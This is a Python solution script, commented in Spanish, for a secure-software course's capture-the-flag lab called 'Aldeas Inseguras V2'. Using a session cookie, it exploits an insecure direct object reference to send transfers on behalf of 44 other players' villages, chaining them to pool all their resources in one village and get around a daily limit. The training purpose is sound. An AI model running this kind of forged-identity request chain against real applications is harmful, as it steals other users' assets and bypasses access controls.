import requests

# =============================================================================
#  Aldeas Inseguras V2 - Resolucion automatizada (IDOR de accion)
#  Curso softwareseguro.com.ar
#
#  El servidor NO valida que 'id_jugador_origen' pertenezca a la sesion activa,
#  por lo que podemos ordenar envios en nombre de CUALQUIER aldea conociendo su
#  UUID. Automatizamos una CADENA de envios que acumula todo en la aldea destino.
#
#  Oro: cada aldea solo puede RECIBIR 1 vez por dia  -> la cadena hace que cada
#       aldea reciba oro una unica vez y lo reenvie acumulado al siguiente.
#  Plata / Bronce: sin limite.
# =============================================================================

# URL del endpoint de envio
URL = "https://chl-75b4d4f6-33dd-4897-ba44-a5c62fe65cb5-aldeas-inseguras-v2.softwareseguro.com.ar/src/ctl/enviar_mercancia.ctl.php"

# Cookie de sesion (PHPSESSID de tu instancia)
PHPSID = "0582687428f7a75b91158f8fcbce75ed"

# -----------------------------------------------------------------------------
#  ALDEA DESTINO: donde se acumula TODO. Debe ser el ULTIMO elemento de la lista.
#  >>> COMPLETAR con el UUID de la aldea destino (Pedro / tu aldea) <<<
# -----------------------------------------------------------------------------
DESTINO = {"nombre": "Pedro", "id": "bdbcc9b006186e87657912bbb0411a37",
           "oro": 0, "plata": 0, "bronce": 0}

# Cadena de aldeas de las que extraemos recursos (44 aldeas cercanas)
jugadores = [
    {"nombre": "Andrés", "id": "39bffa01f5b07b2a651fe9d973492e46",
        "oro": 4921, "plata": 1162, "bronce": 9752},
    {"nombre": "Valeria", "id": "111ccefe3a4a88fbf9a7260547dbc084",
        "oro": 4563, "plata": 2022, "bronce": 2453},
    {"nombre": "Mateo", "id": "ee2e04b3d8686ef9a055626e762c20be",
        "oro": 1311, "plata": 2056, "bronce": 3493},
    {"nombre": "Marina", "id": "97238101b434ef7873b08bd9789b0779",
        "oro": 745, "plata": 1122, "bronce": 11621},
    {"nombre": "Iván", "id": "bc4aa16b743a3dfba7b9617b8fcca2a3",
        "oro": 4552, "plata": 1543, "bronce": 4340},
    {"nombre": "Ramiro", "id": "bde44e88ebd3925ff843b2e31bda83d7",
        "oro": 3322, "plata": 3344, "bronce": 10483},
    {"nombre": "Benjamín", "id": "74d2afa3a1f4894c8829c6f80a7a436b",
        "oro": 4415, "plata": 125, "bronce": 3177},
    {"nombre": "Elena", "id": "f29ae2207b53b27bc0cfb758b910476f",
        "oro": 4018, "plata": 1739, "bronce": 14388},
    {"nombre": "Fernanda", "id": "f6cb7ff9058fdfe1b6cd21de0dcb4618",
        "oro": 1585, "plata": 1678, "bronce": 7819},
    {"nombre": "Rocío", "id": "e9432dc2f3f99b5d00fb4144d232efda",
        "oro": 2319, "plata": 2997, "bronce": 7503},
    {"nombre": "Ricardo", "id": "6464c004dfdf96f42bd5d64f8e3f507d",
        "oro": 3054, "plata": 687, "bronce": 6498},
    {"nombre": "Raúl", "id": "6aca358cf89c4ee1b46cfef0ace4e0bf",
        "oro": 2569, "plata": 616, "bronce": 8109},
    {"nombre": "Micaela", "id": "d9537eba52bbfccfb912b2bdf64d6142",
        "oro": 248, "plata": 2440, "bronce": 7940},
    {"nombre": "Lorena", "id": "be637e3073a1e7e5cfb86c5978c9560a",
        "oro": 1433, "plata": 2620, "bronce": 13103},
    {"nombre": "Natalia", "id": "ac550a1da769ae43f800adbff174e7dc",
        "oro": 3592, "plata": 123, "bronce": 9428},
    {"nombre": "Felipe", "id": "9fedb91a0f93706d7f09b44d0e5b94c1",
        "oro": 4676, "plata": 3489, "bronce": 8519},
    {"nombre": "Pamela", "id": "115d2db0ba51ec6f82172a6246551b17",
        "oro": 929, "plata": 135, "bronce": 13593},
    {"nombre": "Lucas", "id": "b43cb96566fcc52a71287afbcf498900",
        "oro": 2208, "plata": 1828, "bronce": 13169},
    {"nombre": "Gabriela", "id": "d68e1ad7131220df462d00caf7d52001",
        "oro": 4029, "plata": 2600, "bronce": 10148},
    {"nombre": "Julieta", "id": "40dd93cfc62726d9a10e378d63fe9fb2",
        "oro": 3502, "plata": 3344, "bronce": 3471},
    {"nombre": "Tomás", "id": "ef257c0254b32357433c5d0dd5388522",
        "oro": 1510, "plata": 3313, "bronce": 3881},
    {"nombre": "Carla", "id": "76f5de481543092426ed96456329db54",
        "oro": 2532, "plata": 2130, "bronce": 1959},
    {"nombre": "Sebastián", "id": "ce04175308c38ebe1429f866c2480b57",
        "oro": 2984, "plata": 3207, "bronce": 9849},
    {"nombre": "Belén", "id": "932b0abd0550a946a7c9fa77d0b433ab",
        "oro": 725, "plata": 768, "bronce": 14753},
    {"nombre": "Daniela", "id": "4f20b8ee035e59c931925351eacf7378",
        "oro": 1989, "plata": 633, "bronce": 5916},
    {"nombre": "Sofía", "id": "8531995b7030121c4440299ffefd65ef",
        "oro": 4910, "plata": 1631, "bronce": 2058},
    {"nombre": "Diego", "id": "f2f935dc6e0c1e382f6dd686d1e1e878",
        "oro": 2791, "plata": 463, "bronce": 10879},
    {"nombre": "Martina", "id": "e96e7bee778fcec8a26b2e1d824b6dd9",
        "oro": 2947, "plata": 3046, "bronce": 3798},
    {"nombre": "Ezequiel", "id": "ef098d1695add0b35b5c65b3827ad3b4",
        "oro": 3441, "plata": 3493, "bronce": 9402},
    {"nombre": "Agustín", "id": "0cf98521e69e11ba393f944d16ecfa51",
        "oro": 4375, "plata": 3003, "bronce": 1180},
    {"nombre": "Cecilia", "id": "96f6667851fab55af355753e9d806cf3",
        "oro": 3658, "plata": 3387, "bronce": 13224},
    {"nombre": "Alejandro", "id": "c3d53e1df4750f72bd4f66d9d171d947",
        "oro": 4728, "plata": 1149, "bronce": 7590},
    {"nombre": "Lucía", "id": "5c1e86a6ed413e62b29974ac120ac435",
        "oro": 834, "plata": 982, "bronce": 5654},
    {"nombre": "Gonzalo", "id": "4dea77c53155f93a3f87873b412325a7",
        "oro": 3164, "plata": 658, "bronce": 12375},
    {"nombre": "Agustina", "id": "75d233774458cae7e375bf7f582c213a",
        "oro": 3686, "plata": 466, "bronce": 2754},
    {"nombre": "Lautaro", "id": "4a868daa1f4aa72e01b10e6fee6c736d",
        "oro": 2231, "plata": 3288, "bronce": 14594},
    {"nombre": "Verónica", "id": "d45e6690027091d238da45f37816342b",
        "oro": 3917, "plata": 2271, "bronce": 10383},
    {"nombre": "Joaquín", "id": "0a3c1c2ca143f24b15ab06eea2a3806b",
        "oro": 1893, "plata": 3004, "bronce": 2241},
    {"nombre": "Carlos", "id": "42ab06fc9d3f4f885b29528a6fff9e06",
        "oro": 2683, "plata": 764, "bronce": 13440},
    {"nombre": "Maximiliano", "id": "98ee51f7953be869c88c256a54d9295d",
        "oro": 3079, "plata": 2307, "bronce": 11467},
    {"nombre": "Fabricio", "id": "20775e3bb85fa3ec2701d374057540de",
        "oro": 4438, "plata": 3257, "bronce": 9305},
    {"nombre": "Camila", "id": "146e3839b123364ccf95374c6b2ea63a",
        "oro": 3402, "plata": 2871, "bronce": 6049},
    {"nombre": "Franco", "id": "470fcd3ceb3271482e0fa2da791bc7cf",
        "oro": 268, "plata": 2184, "bronce": 11599},
    {"nombre": "Florencia", "id": "180b65657a46f840a085fe7e4ef880b4",
        "oro": 1769, "plata": 171, "bronce": 2363},
    DESTINO,  # el ultimo acumula todo lo enviado en la cadena
]

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
}

cookies = {
    "PHPSESSID": PHPSID,
}


def enviar_recurso(jugadores, tipo_recurso):
    nombre_recurso = {1: "Oro", 2: "Plata", 3: "Bronce"}[tipo_recurso]
    clave = {1: "oro", 2: "plata", 3: "bronce"}[tipo_recurso]
    print(f"\n==> Enviando {nombre_recurso} en cadena...\n")

    for i in range(len(jugadores) - 1):
        origen = jugadores[i]
        destino = jugadores[i + 1]

        # cantidad acumulada: todo lo que junto la cadena hasta este punto
        cantidad = sum(jugadores[j][clave] for j in range(i + 1))
        if cantidad <= 0:
            continue

        data = {
            "id_jugador_origen": origen["id"],
            "select_jugador_destino": destino["id"],
            "select_recurso": str(tipo_recurso),
            "txt_cantidad": str(cantidad),
        }

        print(f"{origen['nombre']:>12} -> {destino['nombre']:<12} | {nombre_recurso}: {cantidad}", flush=True)
        try:
            r = requests.post(URL, headers=headers, cookies=cookies, data=data, timeout=20)
            print(f"    Status: {r.status_code} {'OK' if r.status_code == 200 else 'ERROR'}", flush=True)
        except requests.exceptions.RequestException as e:
            print(f"    ERROR de red: {e}", flush=True)


if __name__ == "__main__":
    if DESTINO["id"] == "PEGAR_UUID_DESTINO_ACA":
        raise SystemExit("[!] Falta completar el UUID de la aldea DESTINO antes de ejecutar.")

    enviar_recurso(jugadores, 1)  # Oro   (1 vez por dia -> la cadena lo respeta)
    enviar_recurso(jugadores, 2)  # Plata (sin limite)
    enviar_recurso(jugadores, 3)  # Bronce (sin limite)
    print("\n[+] Cadena completa. Revisa el saldo de la aldea destino.")
